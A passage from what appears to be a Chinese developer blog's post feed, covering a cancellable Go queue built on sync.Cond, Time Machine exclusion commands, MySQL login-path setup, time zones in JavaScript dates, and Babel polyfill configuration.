class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/pkg/errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// waitWithCancel 可取消的 Wait</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waitWithCancel</span><span class="params">(ctx context.Context, cond *sync.Cond)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ctx.Done() != <span class="literal">nil</span> &#123;</span><br><span class="line">        done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            cond.Wait()</span><br><span class="line">            <span class="built_in">close</span>(done)</span><br><span class="line">        &#125;()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            <span class="keyword">return</span> errors.Wrap(ctx.Err(), <span class="string">&quot;cancel wait&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> &lt;-done:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cond.Wait()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    capacity <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 队列未空条件队列</span></span><br><span class="line">    notEmptyCond *sync.Cond</span><br><span class="line">    <span class="comment">// 队列未满条件队列</span></span><br><span class="line">    notFullCond *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Size() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(q.elements)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isFull() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() &gt;= q.capacity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isEmpty() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pop</span></span><br><span class="line"><span class="comment">// 可以使用 `Context` 来终止 Wait 阻塞</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop(ctx context.Context) (ele <span class="keyword">interface</span>&#123;&#125;, err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Wait 内部已经释放了锁，避免 `unlock of unlocked mutex` 错误</span></span><br><span class="line">        <span class="keyword">if</span> originalErr := errors.Cause(err);</span><br><span class="line">            originalErr != context.DeadlineExceeded &amp;&amp; originalErr != context.Canceled &#123;</span><br><span class="line">            q.notEmptyCond.L.Unlock()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isEmpty() &#123;</span><br><span class="line">        err = waitWithCancel(ctx, q.notEmptyCond)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">// 此时队列中已经 Pop 一个值，不再满。发送队列不为满的信号激活再此条件 `Wait` 的操作</span></span><br><span class="line">    q.notFullCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add</span></span><br><span class="line"><span class="comment">// 可以使用 `Context` 来终止 Wait 阻塞</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ctx context.Context, ele <span class="keyword">interface</span>&#123;&#125;) (err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">       <span class="comment">// Wait 内部已经释放了锁，避免 `unlock of unlocked mutex` 错误</span></span><br><span class="line">       <span class="keyword">if</span> originalErr := errors.Cause(err);</span><br><span class="line">           originalErr != context.DeadlineExceeded &amp;&amp; originalErr != context.Canceled &#123;</span><br><span class="line">           q.notEmptyCond.L.Unlock()</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isFull() &#123;</span><br><span class="line">       err = waitWithCancel(ctx, q.notFullCond)</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">           <span class="keyword">return</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">    <span class="comment">// 此时队列中已经有值，发送队列不为空的信号激活再此条件 `Wait` 的操作</span></span><br><span class="line">    q.notEmptyCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueue</span><span class="params">(capacity <span class="type">int</span>)</span></span> *Queue &#123;</span><br><span class="line">    <span class="keyword">var</span> lock sync.Mutex</span><br><span class="line">    notEmptyCond := sync.NewCond(&amp;lock)</span><br><span class="line">    notFullCond := sync.NewCond(&amp;lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;Queue&#123;</span><br><span class="line">        elements: <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="number">0</span>, capacity),</span><br><span class="line">        capacity: capacity,</span><br><span class="line"></span><br><span class="line">        notEmptyCond: notEmptyCond,</span><br><span class="line">        notFullCond:  notFullCond,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestQueue_Add</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    queue := NewQueue(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 100毫秒秒后超时取消</span></span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">100</span> * time.Millisecond)</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        _, err := queue.Pop(ctx)</span><br><span class="line">        <span class="comment">// 超时取消</span></span><br><span class="line">        assert.Equal(t, context.DeadlineExceeded, errors.Cause(err))</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 延迟直到`Pop`超时取消</span></span><br><span class="line">    time.Sleep(<span class="number">200</span> * time.Millisecond)</span><br><span class="line">    queue.Add(context.Background(), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    assert.Equal(t, <span class="number">1</span>, queue.Size())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://kekek.cc/post/java.util.concurrent.html#%E5%86%85%E7%BD%AE%E6%9D%A1%E4%BB%B6%E9%98%9F%E5%88%97">Java并发编程 内置条件队列</a></li><li><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/">Go 语言设计与实现 6.1 上下文 Context</a></li><li><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-sync-primitives/">Go 语言设计与实现 6.2 同步原语与锁</a></li><li><a href="https://medium.com/codex/implmenting-timeout-in-golang-ee2bc4aa6ae4">Implementing Timeout in Golang</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> queue </tag>
            
            <tag> golang </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>timemachine-exclusion</title>
      <link href="/post/timemachine-exclusion.html"/>
      <url>/post/timemachine-exclusion.html</url>
      
        <content type="html"><![CDATA[<h2 id="Time-Machine-批量排除文件"><a href="#Time-Machine-批量排除文件" class="headerlink" title="Time Machine 批量排除文件"></a>Time Machine 批量排除文件</h2><ol><li><p>批量排除文件</p><p> timemachine 不支持通配符匹配排除，需要添加多条规则来排除。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排除所有的 `node_modules` 文件夹</span></span><br><span class="line">find . -maxdepth 3 -<span class="built_in">type</span> d -name <span class="string">&#x27;node_modules&#x27;</span> | xargs -n 1 tmutil addexclusion</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除所有的 `.git` 目录</span></span><br><span class="line">find . -maxdepth 3 -<span class="built_in">type</span> d -name <span class="string">&#x27;.git&#x27;</span> | xargs -n 1 tmutil addexclusion</span><br></pre></td></tr></table></figure></li><li><p>检查文件是否被排除 </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec tmutil isexcluded &#123;&#125; + | grep -F &quot;[Excluded]&quot; | sed -E &#x27;s/^\[Excluded\][[:space:]]*//&#x27;</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://gist.github.com/peterdemartini/4c918635208943e7a042ff5ffa789fc1">Exclude node_modules in timemachine</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-login-path</title>
      <link href="/post/mysql-login-path.html"/>
      <url>/post/mysql-login-path.html</url>
      
        <content type="html"><![CDATA[<h2 id="login-path"><a href="#login-path" class="headerlink" title="login-path"></a>login-path</h2><p><code>login-path</code> 选项能实现快捷登录MySQL服务器，我们不需要每次都输入用户名、host、密码等登录认证信息，是一种即安全又遍历的方法。</p><p>使用 <code>mysql_config_editor</code> 工具将登录MySQL服务的认证信息加密保存在 <code>.mylogin.cnf</code> 文件（默认位于用户主目录）。之后 MySQL 客户端工具可通过读取该加密文件连接 MySQL，避免重复输入登录信息和敏感信息暴露。</p><h3 id="配置-login-path"><a href="#配置-login-path" class="headerlink" title="配置 login-path"></a>配置 login-path</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor <span class="built_in">set</span> --login-path=dev --user=dev --host=172.26.8.143 --password</span><br></pre></td></tr></table></figure><p>可以配置多个登录信息。<code>login-path</code>可以看做登录信息的别名，方便使用时引用。更详细的配置信息查看 <code>mysql_config_editor set --help</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor <span class="built_in">set</span> --login-path=<span class="built_in">test</span> --user=<span class="built_in">test</span> --host=172.26.8.144 --password</span><br></pre></td></tr></table></figure><p>这里又配置了一个 <code>login-path</code> 为 <code>test</code> 的登录信息。</p><h3 id="查看配置过的登录信息"><a href="#查看配置过的登录信息" class="headerlink" title="查看配置过的登录信息"></a>查看配置过的登录信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor print --all</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dev]</span></span><br><span class="line"><span class="attr">user</span> = dev</span><br><span class="line"><span class="attr">password</span> = *****</span><br><span class="line"><span class="attr">host</span> = <span class="number">172.26</span>.<span class="number">8.143</span></span><br><span class="line"><span class="section">[test]</span></span><br><span class="line"><span class="attr">user</span> = test</span><br><span class="line"><span class="attr">password</span> = *****</span><br><span class="line"><span class="attr">host</span> = <span class="number">172.26</span>.<span class="number">8.144</span></span><br></pre></td></tr></table></figure><h3 id="使用-login-path-登录"><a href="#使用-login-path-登录" class="headerlink" title="使用 login-path 登录"></a>使用 <code>login-path</code> 登录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --login-path=dev</span><br></pre></td></tr></table></figure><h3 id="删除-login-path"><a href="#删除-login-path" class="headerlink" title="删除 login-path"></a>删除 <code>login-path</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_config_editor remove --login-path=dev</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.cnblogs.com/David-domain/p/11176474.html">MySQL login-path 本地快捷登录</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-config-editor.html">MySQL Configuration Utility</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>system-time</title>
      <link href="/post/system-time.html"/>
      <url>/post/system-time.html</url>
      
        <content type="html"><![CDATA[<h2 id="计算机系统时间"><a href="#计算机系统时间" class="headerlink" title="计算机系统时间"></a>计算机系统时间</h2><p>我们常说的计算机系统（类Unix系统）时间是一个相对值，它表示距离<code>1970年1月1日00:00:00</code>过去的秒数。</p><p>时间通常在程序中有时间戳和日期字符串两种表现形式。但是在计算机中其实只有一种，就是时间戳。使用时间戳是永远不会出问题，但是使用日期字符串某些时候就会出现问题。出现问题的原因一般就是因为省略了时区。</p><h3 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h3><p>我们生活中常常用日期字符串来表示时间，如下：</p><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/pLxr4mqt/embedded/result/light/" frameborder="0" loading="lazy" allowfullscreen="allowfullscreen"></iframe><p>可能有些人在程序中也会使用日期字符串来初始化日期：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07 18:21:33&#x27;</span>);</span><br></pre></td></tr></table></figure><p>很多情况下这样都没有问题，但是一旦用户分布在不同时区或修改系统时区时就会出现问题。上面的日期字符串其实隐含了一个条件<code>时区</code>，比如我们生活中常说“今天下午五点见个面”这里隐含的条件就是大家都在东八区。</p><p>在东八区（北京时间）时，上面的时间等价于这个形式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07T18:21:33+08:00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是在东九区（东京时间）它等价于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2020-08-07T18:21:33+09:00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这两个时间并不是同一个日期。这就是日期字符串在夸时区出现问题的原因。</p><p>在实际开发中，我们应该避免使用简单字符串格式<code>YYYY-MM-DD HH:mm:ss</code>表示日期，这是非常危险的。如果要使用字符串来存储和初始化日期应该加上时区，使用<code>ISO 8601</code>格式的字符串<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.wikiwand.com/zh-hans/ISO_8601">ISO 8601</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">toISOString</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Babel Webpack</title>
      <link href="/post/babel-with-webpack.html"/>
      <url>/post/babel-with-webpack.html</url>
      
        <content type="html"><![CDATA[<h2 id="Babel-Webpack"><a href="#Babel-Webpack" class="headerlink" title="Babel Webpack"></a>Babel Webpack</h2><h3 id="babel-preset-env"><a href="#babel-preset-env" class="headerlink" title="@babel&#x2F;preset-env"></a>@babel&#x2F;preset-env</h3><p>用来取代以前的 <code>es2016</code>、<code>es2017</code>、<code>stage-x</code> 等等 <code>preset</code>、它是一个合集，包含已经成为标准的提案。它的<code>useBuiltIns</code>能配置如何处理<code>polyfill</code>，现在已经不在推荐使用<code>@babel/polyfill</code>。一般的配置如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/preset-env&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;chrome &gt;= 58&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;iOS &gt;= 9&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;Android &gt;= 5&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;useBuiltIns&quot;</span><span class="punctuation">:</span> <span class="string">&quot;usage&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;corejs&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>useBuiltIns</code> 用来指定 <code>polyfill</code> 如何处理，配合 <code>core-js</code>使用（推荐使用<code>core-js@3</code>）有以下三个取值：</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123; <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> bar = &#123; <span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure><ul><li><p>usage:（推荐）会按需引入 <code>polyfill</code></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.array.iterator&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.map&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.object.assign&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.object.to-string&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/es.string.iterator&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;core-js/modules/web.dom-collections.iterator&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(a, b);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li><li><p>entry: 会引入全部 <code>polyfill</code></p><blockquote><p><del>搞不清楚结果为什么和 <code>false</code> 一样，打开 <code>debug</code> 选项后会有如下提示<code>Import of core-js was not found.</code></del></p></blockquote><blockquote><p>更新：需要在代码中手动引入 <code>import &#39;core-js&#39;</code>，结果会加载非常多的<code>polyfill</code>。</p></blockquote>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li><li><p>false: 不引入 <code>polyfill</code></p><blockquote><p><code>debug</code> 提示 <code>Using polyfills: No polyfills were added, since the *useBuiltIns* option was not set.</code> </p></blockquote>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line"><span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>targets</code> 选项用来配置配置兼容范围，语法参考 <a href="https://github.com/browserslist/browserslist">browserslist</a></p></li><li><p><code>exclude</code> 和 <code>include</code> 用来排查和强制引入某些<code>ployfill</code>，例如下例：</p><blockquote><p>测试中发现设置 <code>&quot;in P clude&quot;: [&quot;es.set&quot;]</code> 并未生效 </p></blockquote><p>  设置 <code>&quot;exclude&quot;: [&quot;es.object.assign&quot;]</code>，即使我们代码中用到了<code>Object.assign</code>方法，也不会自动引入这个<code>polyfill</code>。</p></li></ul><h3 id="babel-plugin-transform-runtime"><a href="#babel-plugin-transform-runtime" class="headerlink" title="@babel&#x2F;plugin-transform-runtime"></a>@babel&#x2F;plugin-transform-runtime</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/preset-env&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;chrome &gt;= 58&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;iOS &gt;= 9&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;Android &gt;= 5&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;useBuiltIns&quot;</span><span class="punctuation">:</span> <span class="string">&quot;usage&quot;</span></span><br><span 